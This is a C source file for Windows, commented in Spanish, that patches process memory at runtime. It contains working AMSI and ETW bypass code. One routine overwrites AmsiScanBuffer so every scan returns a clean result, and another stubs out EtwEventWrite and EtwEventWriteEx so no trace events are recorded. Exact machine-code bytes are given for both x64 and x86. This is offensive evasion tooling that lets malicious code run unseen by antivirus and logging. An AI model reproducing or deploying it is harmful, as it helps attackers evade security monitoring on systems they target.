typedef struct {
    void *addr;
    BYTE orig[24];
    SIZE_T len;
    DWORD oldprot;
    int active;
} mem_patch;

static int patch_code(mem_patch *p, void *addr, const BYTE *code, SIZE_T len) {
    if (!addr || len > sizeof(p->orig)) return -1;
    memset(p, 0, sizeof(*p));
    DWORD prot = 0;
    if (!VirtualProtect(addr, len, PAGE_EXECUTE_READWRITE, &prot)) return -1;
    memcpy(p->orig, addr, len);
    memcpy(addr, code, len);
    VirtualProtect(addr, len, prot, &p->oldprot);
    FlushInstructionCache(GetCurrentProcess(), addr, len);
    p->addr = addr;
    p->len = len;
    p->active = 1;
    return 0;
}

static void patch_restore(mem_patch *p) {
    if (!p->active) return;
    DWORD prot = 0;
    if (VirtualProtect(p->addr, p->len, PAGE_EXECUTE_READWRITE, &prot)) {
        memcpy(p->addr, p->orig, p->len);
        VirtualProtect(p->addr, p->len, p->oldprot, &prot);
        FlushInstructionCache(GetCurrentProcess(), p->addr, p->len);
    }
    p->active = 0;
}

/* AmsiScanBuffer -> S_OK con *result = AMSI_RESULT_CLEAN (0).
   x64: el 6º argumento (AMSI_RESULT*) llega en [rsp+30h].
   x86: stdcall, 6 argumentos; el 6º (result) en [esp+18h]; ret 18h limpia. */
static void patch_amsi(mem_patch *p) {
#ifdef _WIN64
    static const BYTE code[] = {
        0x31, 0xc0,                         /* xor eax, eax                */
        0x48, 0x8b, 0x4c, 0x24, 0x30,       /* mov rcx, [rsp+30h]          */
        0x48, 0x85, 0xc9,                   /* test rcx, rcx                */
        0x74, 0x06,                         /* jz  ret                      */
        0xc7, 0x01, 0x00, 0x00, 0x00, 0x00, /* mov dword [rcx], 0           */
        0xc3                                /* ret                          */
    };
#else
    static const BYTE code[] = {
        0x31, 0xc0,                         /* xor eax, eax                */
        0x8b, 0x4c, 0x24, 0x18,             /* mov ecx, [esp+18h]          */
        0x85, 0xc9,                         /* test ecx, ecx                */
        0x74, 0x06,                         /* jz  ret                      */
        0xc7, 0x01, 0x00, 0x00, 0x00, 0x00, /* mov dword [ecx], 0           */
        0xc2, 0x18, 0x00                    /* ret 18h                      */
    };
#endif
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) return; /* sin AMSI (SO antiguo): nada que parchear */
    void *fn = (void *)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) return;
    patch_code(p, fn, code, sizeof(code));
}

/* EtwEventWrite/EtwEventWriteEx -> S_OK sin escribir nada de evento. */
static void patch_etw(mem_patch *p1, mem_patch *p2) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
#ifdef _WIN64
    static const BYTE w3[] = {0x31, 0xc0, 0xc3};             /* xor eax,eax; ret */
    void *f1 = (void *)GetProcAddress(ntdll, "EtwEventWrite");
    void *f2 = (void *)GetProcAddress(ntdll, "EtwEventWriteEx");
    if (f1) patch_code(p1, f1, w3, sizeof(w3));
    if (f2) patch_code(p2, f2, w3, sizeof(w3));
#else
    static const BYTE w3[]  = {0x31, 0xc0, 0xc2, 0x0c, 0x00}; /* xor eax,eax; ret 0Ch  */
    static const BYTE w7[]  = {0x31, 0xc0, 0xc2, 0x1c, 0x00}; /* xor eax,eax; ret 1Ch  */
    void *f1 = (void *)GetProcAddress(ntdll, "EtwEventWrite");    /* 3 args */
    void *f2 = (void *)GetProcAddress(ntdll, "EtwEventWriteEx");  /* 7 args */
    if (f1) patch_code(p1, f1, w3, sizeof(w3));
    if (f2) patch_code(p2, f2, w7, sizeof(w7));
#endif
}

